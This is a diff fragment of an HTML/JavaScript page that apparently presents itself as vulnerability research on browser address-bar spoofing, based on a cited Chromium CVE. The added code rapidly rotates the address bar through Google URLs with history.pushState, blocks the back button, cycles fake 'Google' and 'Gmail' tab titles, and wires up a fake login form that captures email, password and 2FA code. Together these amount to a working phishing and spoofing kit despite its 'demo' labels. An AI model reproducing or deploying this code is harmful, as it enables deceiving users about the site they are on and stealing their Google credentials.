+        let currentIndex = 0;
+        
+        // Aggressive history rotation
+        const interval = setInterval(() => {
+            const target = targets[currentIndex % targets.length];
+            try {
+                history.pushState({}, '', target);
+                currentIndex++;
+            } catch(e) {}
+        }, 15);
+        activeIntervals.push(interval);
+        
+        // Backup lock
+        const backupInterval = setInterval(() => {
+            const lastTarget = targets[(currentIndex - 1) % targets.length];
+            if (window.location.href !== lastTarget) {
+                history.replaceState({}, '', lastTarget);
+            }
+        }, 30);
+        activeIntervals.push(backupInterval);
+        
+        // Override popstate
+        const popstateBlocker = (e) => {
+            e.preventDefault();
+            history.go(1);
+        };
+        window.addEventListener('popstate', popstateBlocker);
+        window.__popstateBlocker = popstateBlocker;
+        
+        // Fake title rotation
+        const titles = ['Google', 'Gmail', 'Google Drive', 'Accounts'];
+        let titleIndex = 0;
+        const titleInterval = setInterval(() => {
+            document.title = titles[titleIndex % titles.length];
+            titleIndex++;
+        }, 200);
+        activeIntervals.push(titleInterval);
+        
+        updateGlobalStatus("[ACTIVE] Timing Attack + History Rotation", true);
+        showNotification("🔮 Aggressive history rotation active! Address bar cycling through Google domains");
     }
     
     // ============================================================
-    // FAKE LOGIN (Demo only)
+    // FAKE LOGIN HANDLER (Demo)
     // ============================================================
-    document.getElementById('loginBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        const email = document.getElementById('emailInput').value;
-        const pass = document.getElementById('passInput').value;
+    function fakeLoginHandler() {
+        const email = document.getElementById('emailField')?.value || '';
+        const pass = document.getElementById('passField')?.value || '';
+        const code = document.getElementById('codeField')?.value || '';
         
         if (email || pass) {
-            showToast(`[DEMO] Credentials captured for demonstration`, 3000);
-            console.log(`[DEMO] Email: ${email}, Password: ${pass}`);
+            showNotification(`[DEMO] Credentials captured for security research`, false);
+            console.log(`[DEMO] Email: ${email}, Password: ${pass}, 2FA: ${code}`);
             
-            // Reset fields setelah demo
-            setTimeout(() => {
-                document.getElementById('emailInput').value = '';
-                document.getElementById('passInput').value = '';
-            }, 2000);
+            // Clear fields
+            if(document.getElementById('emailField')) document.getElementById('emailField').value = '';
+            if(document.getElementById('passField')) document.getElementById('passField').value = '';
+            if(document.getElementById('codeField')) document.getElementById('codeField').value = '';
         }
-    });
+    }
     
     // ============================================================
     // EVENT LISTENERS
     // ============================================================
-    document.getElementById('exploitScenario1').addEventListener('click', exploitScenario1);
-    document.getElementById('exploitScenario2').addEventListener('click', exploitScenario2);
-    document.getElementById('exploitScenario3').addEventListener('click', exploitScenario3);
-    document.getElementById('exploitScrollLock').addEventListener('click', exploitScrollLock);
-    document.getElementById('resetExploit').addEventListener('click', resetExploit);
+    document.getElementById('technique1').addEventListener('click', techniqueNavigationPreload);
+    document.getElementById('technique2').addEventListener('click', techniqueBFCachePoison);
+    document.getElementById('technique3').addEventListener('click', techniqueViewportTransition);
+    document.getElementById('technique4').addEventListener('click', techniqueSpeculationRules);
+    document.getElementById('technique5').addEventListener('click', techniqueTimingAttack);
+    document.getElementById('techniqueReset').addEventListener('click', resetAll);
+    document.getElementById('fakeLoginBtn').addEventListener('click', fakeLoginHandler);
     
-    // Initial status
-    updateStatus("Ready | Select exploit scenario", false);
+    // Dashboard toggle minimize
+    let isMinimized = false;
+    const dashboard = document.getElementById('exploitDashboard');
+    const toggleBtn = document.getElementById('dashboardToggle');
+    const contentDiv = document.getElementById('dashboardContent');
     
-    console.log("%c🔥 CVE-2024-6995 Address Bar Spoofing Exploit", "color: #ff6b6b; font-size: 14px; font-weight: bold;");
-    console.log("Based on Chromium VRP $6,000 bounty report");
-    console.log("Root cause: BrowserControlsManager fails to update address bar during scroll + tab switch/close");
-    console.log("");
-    console.log("📋 SCENARIOS:");
-    console.log("  1. Tab Close Spoof — Close tab while scrolling");
-    console.log("  2. Tab Switch Spoof — Switch tabs during scroll");
-    console.log("  3. PiP Auto-Trigger — Picture-in-Picture + scroll");
-    console.log("  4. Scroll Lock — Lock address bar during scroll");
+    toggleBtn.addEventListener('click', () => {
+        isMinimized = !isMinimized;
+        if (isMinimized) {
+            contentDiv.style.display = 'none';
+            dashboard.classList.add('minimized');
+        } else {
+            contentDiv.style.display = 'flex';
+            dashboard.classList.remove('minimized');
+        }
+    });
+    
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        cleanupIntervals();
+        if (window.__bfcacheHandler) {
+            window.removeEventListener('pagehide', window.__bfcacheHandler);
+        }
+        if (window.__popstateBlocker) {
+            window.removeEventListener('popstate', window.__popstateBlocker);
+        }
+        if (window.__speculationCleanup) {
+            window.__speculationCleanup();
+        }
+    });
+    
+    console.log('%c⚡ NOVUS VULN RESEARCH v5.0', 'color: #ff6b6b; font-size: 16px; font-weight: bold;');
+    console.log('Fresh Techniques:');
+    console.log('  1. Navigation Preload API Spoof');
+    console.log('  2. BFCache Poisoning');
+    console.log('  3. Viewport Transition Exploit');
+    console.log('  4. Speculation Rules API Abuse');
+    console.log('  5. Timing Attack + History Rotation');
+    
+    updateGlobalStatus("Ready | 5 fresh techniques available", false);
 </script>
 </body>
 </html>
